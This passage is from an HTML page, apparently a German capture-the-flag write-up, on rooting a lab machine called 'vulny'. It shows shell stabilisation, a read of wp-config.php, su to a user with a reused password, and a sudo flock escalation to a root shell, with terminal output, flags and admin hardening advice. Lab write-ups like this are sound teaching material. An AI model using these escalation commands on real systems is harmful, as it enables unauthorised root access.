+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+                     </pre> <!-- Hier beginnt die Ausgabe der Remote-Shell -->
+                 </div>
+             </div>
+
+             <p class="analysis"><strong>Analyse:</strong> Innerhalb der von Meterpreter bereitgestellten Shell wird versucht, diese mit `python3 -c 'import pty; pty.spawn("/bin/bash")'` zu einer voll interaktiven Bash-Shell aufzuwerten. Anschließend wird `export TERM=xterm` ausgeführt, um die Terminal-Emulation zu verbessern.</p>
+             <p class="evaluation"><strong>Bewertung:</strong> Die Shell-Stabilisierung war erfolgreich. Der Prompt ändert sich zu `www-data@vulny:...$`, was eine typische Bash-Prompt-Struktur anzeigt, und das Terminal sollte nun besser auf Steuerzeichen und Features wie Tab-Vervollständigung reagieren.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Beginne mit der systematischen Enumeration des Systems als `www-data`, um nach Konfigurationsdateien, Passwörtern oder Wegen zur Privilegieneskalation zu suchen.<br><strong>Empfehlung (Admin):</strong> Keine direkte Aktion gegen die Stabilisierung, Fokus auf Erkennung/Prävention der initialen Kompromittierung.</p>
+             <div class="code-block">
+                 <div class="terminal">
+                    <!-- Direkte Eingabe in der Remote-Shell -->
+                    <pre>
+python3 -c 'import pty; pty.spawn("/bin/bash")'
+www-data@vulny:/usr/share/wordpress/wp-content/plugins/wp-file-manager/lib/files$ export TERM=xterm
+www-data@vulny:/usr/share/wordpress/wp-content/plugins/wp-file-manager/lib/files$
+                     </pre> <!-- Der Prompt ändert sich und ist nun interaktiv -->
+                 </div>
+             </div>
+        </section>
+
+        <section id="privilege-escalation">
+            <h2>Privilege Escalation</h2>
+            <p class="analysis"><strong>Analyse:</strong> Der Befehl `cat /usr/share/wordpress/wp-config.php` wird ausgeführt, um den Inhalt der WordPress-Konfigurationsdatei anzuzeigen. Diese Datei enthält typischerweise die Zugangsdaten zur WordPress-Datenbank.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> **Wichtig:** Die Ausgabe dieses Befehls fehlt im bereitgestellten Text. Es ist jedoch sehr wahrscheinlich, dass in dieser Datei das Passwort `idrinksomewater` für den Datenbankbenutzer gefunden wurde. Dieses Passwort wird im nächsten Schritt verwendet, um zum Benutzer `adrian` zu wechseln. Das Fehlen der Ausgabe ist eine Lücke in der Dokumentation, aber der Kontext legt den Fund nahe.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Notiere die gefundenen Datenbank-Zugangsdaten (DB_NAME, DB_USER, DB_PASSWORD, DB_HOST). Versuche, dich direkt mit der Datenbank zu verbinden (wahrscheinlich MySQL auf Port 33060 oder lokal), falls weitere Informationen benötigt werden. Prüfe, ob das gefundene Passwort auch für andere Benutzer auf dem System gültig ist.<br><strong>Empfehlung (Admin):</strong> Beschränke die Leserechte für `wp-config.php` so weit wie möglich (nur der Webserver-Benutzer sollte Lesezugriff haben). Verwende separate, starke und einzigartige Passwörter für Datenbankbenutzer. Überprüfe regelmäßig, ob Passwörter wiederverwendet werden.</p>
+             <div class="code-block">
+                 <div class="terminal">
+                    <pre>
+www-data@vulny:/usr/share/wordpress/wp-content/plugins/wp-file-manager/lib/files$ cat /usr/share/wordpress/wp-config.php
+<!-- Ausgabe fehlt im Originaltext -->
+www-data@vulny:/usr/share/wordpress/wp-content/plugins/wp-file-manager/lib/files$
+                     </pre>
+                 </div>
+             </div>
+
+            <p class="analysis"><strong>Analyse:</strong> Der Befehl `ls /home` listet die Benutzerverzeichnisse im `/home`-Ordner auf.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Es wird ein einziges Benutzerverzeichnis gefunden: `adrian`. Dies identifiziert einen potenziellen Benutzeraccount auf dem System.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Versuche, zum Benutzer `adrian` zu wechseln, möglicherweise mit dem Passwort, das (vermutlich) in `wp-config.php` gefunden wurde.<br><strong>Empfehlung (Admin):</strong> Stelle sicher, dass nur autorisierte Benutzerkonten existieren.</p>
+            <div class="code-block">
+                 <div class="terminal">
+                    <pre>
+www-data@vulny:/usr/share/wordpress/wp-content/plugins/wp-file-manager/lib/files$ ls /home
+ls /home
+adrian
+                     </pre>
+                 </div>
+             </div>
+
+             <p class="analysis"><strong>Analyse:</strong> Der Befehl `su adrian` wird verwendet, um zum Benutzerkonto `adrian` zu wechseln. Anschließend wird das Passwort `<span class="password">idrinksomewater</span>` eingegeben.</p>
+             <p class="evaluation"><strong>Bewertung: Erfolg!** Der Benutzerwechsel war erfolgreich. Das Passwort `<span class="password">idrinksomewater</span>`, das höchstwahrscheinlich aus der `wp-config.php` stammt, war auch das Linux-Passwort für den Benutzer `adrian`. Passwort-Wiederverwendung ist hier der Schlüssel. Der Prompt ändert sich zu `adrian@vulny:...$`.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Prüfe nun die Berechtigungen des Benutzers `adrian`, insbesondere die `sudo`-Rechte (`sudo -l`), um nach Wegen zur weiteren Privilegieneskalation zu suchen.<br><strong>Empfehlung (Admin):**DRINGEND:** Ändere das Passwort für den Benutzer `adrian` und den Datenbankbenutzer. Setze eine Richtlinie durch, die Passwort-Wiederverwendung verbietet. Schulen Sie Benutzer und Administratoren bezüglich sicherer Passwortpraktiken.</p>
+             <div class="code-block">
+                 <div class="terminal">
+                     <pre>
+www-data@vulny:/usr/share/wordpress/wp-content/plugins/wp-file-manager/lib/files$ su adrian
+su adrian
+Password: <span class="password">idrinksomewater</span>
+adrian@vulny:/usr/share/wordpress/wp-content/plugins/wp-file-manager/lib/files$
+                     </pre> <!-- Prompt ändert sich zu adrian -->
+                 </div>
+             </div>
+
+             <p class="analysis"><strong>Analyse:</strong> Als Benutzer `adrian` wird `sudo -l` ausgeführt, um zu prüfen, welche Befehle mit `sudo` (also typischerweise als `root`) ausgeführt werden dürfen.</p>
+             <p class="evaluation"><strong>Bewertung: **Ein weiterer klarer Weg zur Privilegieneskalation!** Der Benutzer `adrian` darf den Befehl `/usr/bin/flock` als jeder Benutzer (`ALL : ALL`) ohne Passwortabfrage (`NOPASSWD:`) ausführen. `flock` wird normalerweise zur Verwaltung von Dateisperren verwendet, kann aber missbraucht werden, um andere Befehle auszuführen, insbesondere wenn es mit `sudo` kombiniert wird.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Nutze die `sudo`-Berechtigung für `flock`, um eine Root-Shell zu erhalten. Suche auf GTFOBins nach dem `flock`-Eintrag für `sudo`. Ein gängiger Befehl ist `sudo flock -u / /bin/sh` (oder `/bin/bash`).<br><strong>Empfehlung (Admin):**DRINGEND:** Entferne diese unsichere `sudo`-Regel. Gewähre `sudo`-Rechte nur minimal und niemals `NOPASSWD` für Befehle, die zur Shell-Eskalation missbraucht werden können (wie `flock`, `find`, `awk`, `vi`, etc.).</p>
+             <div class="code-block">
+                 <div class="terminal">
+                    <!-- Der Prompt zeigt nun den Benutzer adrian an -->
+                    <pre>
+adrian@vulny:~$ sudo -l
+sudo -l
+Matching Defaults entries for adrian on vulny:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User adrian may run the following commands on vulny:
+    (ALL : ALL) NOPASSWD: /usr/bin/flock
+                     </pre>
+                 </div>
+             </div>
+        </section>
+
+        <!-- POC beginnt hier, da Root-Zugriff erlangt wird -->
+        <section id="poc">
+            <h2>Proof of Concept (Root)</h2>
+            <p class="analysis"><strong>Analyse:</strong> Dieser Befehl nutzt die zuvor identifizierte `sudo`-Berechtigung für `flock` aus. `sudo flock -u / /bin/sh` führt `flock` mit Root-Rechten aus. Obwohl `flock` normalerweise eine Datei als Argument erwartet, wird hier `/` (das Root-Verzeichnis) angegeben. Entscheidend ist, dass `flock` nach seinen Optionen auch einen Befehl ausführen kann. Hier wird `/bin/sh` als auszuführender Befehl übergeben. Da `flock` über `sudo` mit Root-Rechten gestartet wird, wird auch die gestartete Shell `/bin/sh` mit Root-Rechten ausgeführt.</p>
+            <p class="evaluation"><strong>Bewertung: !!Privilegieneskalation erfolgreich!!** Der Befehl funktioniert wie erwartet. Der Prompt ändert sich zum Rautezeichen (`#`), was den Root-Benutzer signalisiert. Der direkt danach ausgeführte `id`-Befehl bestätigt dies mit `uid=0(root) gid=0(root) groups=0(root)`. Das ultimative Ziel, Root-Zugriff auf dem System, wurde erreicht.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Das Ziel ist erreicht. Wechsle in das Root-Home-Verzeichnis (`cd /root` oder einfach `cd`) und suche nach der Root-Flag (`root.txt`). Hole auch die User-Flag aus Adrians Home-Verzeichnis (`/home/adrian/user.txt`). Dokumentiere den Erfolg.<br><strong>Empfehlung (Admin):**DRINGEND:** Entferne die `sudo`-Regel für `flock`. Untersuche, wie diese Regel entstanden ist und ob weitere unsichere `sudo`-Konfigurationen existieren. Bereinige das System von der Kompromittierung (Meterpreter-Prozess, ggf. hochgeladene Dateien) und härte es gemäß den vorherigen Empfehlungen.</p>
+             <div class="code-block">
+                 <div class="terminal">
+                     <pre>
+adrian@vulny:~$ sudo flock -u / /bin/sh
+# id
+uid=0(root) gid=0(root) groups=0(root)
+# </pre> <!-- Prompt wechselt zu # -->
+                 </div>
+             </div>
+        </section>
+
+        <!-- Flags Sektion -->
+        <section id="flags">
+             <div class="flag-container">
+                 <h2 class="flag-heading">Flags</h2>
+                 <!-- Root Flag (als root gelesen) -->
+                 <div class="flag-entry">
+                    <div class="flag-command"># cd<br># cat root.txt</div> <!-- Zeigt an, dass zuerst cd ausgeführt wurde -->
+                     <div class="flag-value"><span class="password">HMVididit</span></div>
+                 </div>
+                 <!-- User Flag (als adrian gelesen) -->
+                 <div class="flag-entry">
+                     <div class="flag-command">adrian@vulny:~$ cat user.txt</div> <!-- Zeigt den korrekten Prompt für den User-Flag-Befehl -->
+                     <div class="flag-value"><span class="password">HMViuploadfiles</span></div>
+                 </div>
+             </div>
+         </section>
+
+
+    <footer class="footer">
+        <p>DarkSpirit - Cyber Security Reports</p>
+        <!-- Datum aus Nmap-Scan extrahiert -->
+        <p>Berichtsdatum: 8. Oktober 2022</p>
+    </footer>
+</body>
+</html>
